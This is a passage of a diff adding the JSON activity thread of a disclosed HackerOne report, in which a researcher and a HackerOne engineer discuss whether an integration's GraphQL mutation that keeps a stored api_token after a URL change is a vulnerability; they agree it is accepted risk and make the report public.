+            "created_at": "2021-04-14T10:58:31.445Z",
+            "updated_at": "2021-04-14T10:58:31.445Z",
+            "actor": {
+                "username": "wvdv",
+                "cleared": false,
+                "verified": false,
+                "url": "/wvdv",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/221/7503cfe93236733876c422fb69d8a9a81824802c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11391110,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Sorry for additional message, since you mentioned you want to keep teams changing URL without changing `api_token` and being able to use it same, I go for disconnecting and sending only URL with GraphQL request for checking if previous `api_token` is stored.\n\n{F1265017}\n{F1265018}\n\nAs we can see from above examples, we can not either send them as empty because function on backend is expecting them to be not blank and in present.\n\nI hope this will also make it more clear.\n\nEdit: I didn't see your reply and was typing. I hope it will be useful, as a fellow engineer I'm more than happy to keep discussion going on :)",
+            "automated_response": false,
+            "created_at": "2021-04-14T11:00:09.062Z",
+            "updated_at": "2021-04-14T11:00:55.439Z",
+            "actor": {
+                "username": "nukedx",
+                "cleared": true,
+                "verified": true,
+                "url": "/nukedx",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1265018,
+                    "filename": "new_integration.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5hecnxlt740ypgk8f9blykjdlfif?response-content-disposition=attachment%3B%20filename%3D%22new_integration.png%22%3B%20filename%2A%3DUTF-8%27%27new_integration.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071124Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2f68f05bdcf87cbfab9dc4bc30d2d42e00d740966b82cbabacbcec0c7d906146"
+                },
+                {
+                    "id": 1265017,
+                    "filename": "new_integration2.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cz6lvkxc49hyb7d2mrvnehb43khi?response-content-disposition=attachment%3B%20filename%3D%22new_integration2.png%22%3B%20filename%2A%3DUTF-8%27%27new_integration2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071124Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4459a30936ffd95abb9ce12c34a7e66488665faa820d7d0b3d4d7efa2e1153ed"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11451704,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @wvdv,\n\nI hope all is well on your end, It has been almost a week I didn't hear back from you, is there any change on your thoughts for this issue?\n\nSincerely,\n@nukedx",
+            "automated_response": false,
+            "created_at": "2021-04-20T10:23:00.309Z",
+            "updated_at": "2021-04-20T10:23:00.309Z",
+            "actor": {
+                "username": "nukedx",
+                "cleared": true,
+                "verified": true,
+                "url": "/nukedx",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11497965,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @nudex, I've asked a co-worker for a second opinion and we believe this isn't a security vulnerability. Granted, it's odd to have such a mutation and not have a UI that supports these operations but that has to do with some previous iteration of the UX of this integration.\n\nI hope you have a great weekend!\n\nWillian",
+            "automated_response": false,
+            "created_at": "2021-04-24T06:07:29.358Z",
+            "updated_at": "2021-04-24T06:07:29.358Z",
+            "actor": {
+                "username": "wvdv",
+                "cleared": false,
+                "verified": false,
+                "url": "/wvdv",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/221/7503cfe93236733876c422fb69d8a9a81824802c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11498111,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Hi @wvdv,\n\nI see well I still highly believe it is a security issue with good example of insider threat, however H1’s approach is also good example for the stance for such case.\n\nSo I believe it won’t be a problem to disclose this and help community to understand what to do the in similar cases for reporting, since it falls on accepted risk category, like report #357576.\n\nWould you mind disclosing it?\n \nI hope you will have a great weekend as well.\n\nSincerely,\n@nukedx\n\n",
+            "automated_response": false,
+            "created_at": "2021-04-24T06:58:39.896Z",
+            "updated_at": "2021-04-24T06:58:39.896Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "nukedx",
+                "cleared": true,
+                "verified": true,
+                "url": "/nukedx",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11573848,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-04-30T05:54:40.527Z",
+            "updated_at": "2021-04-30T05:54:40.527Z",
+            "actor": {
+                "username": "wvdv",
+                "cleared": false,
+                "verified": false,
+                "url": "/wvdv",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/221/7503cfe93236733876c422fb69d8a9a81824802c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11573849,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-04-30T05:54:40.753Z",
+            "updated_at": "2021-04-30T05:54:40.753Z",
+            "actor": {
+                "username": "wvdv",
+                "cleared": false,
+                "verified": false,
+                "url": "/wvdv",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/221/7503cfe93236733876c422fb69d8a9a81824802c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
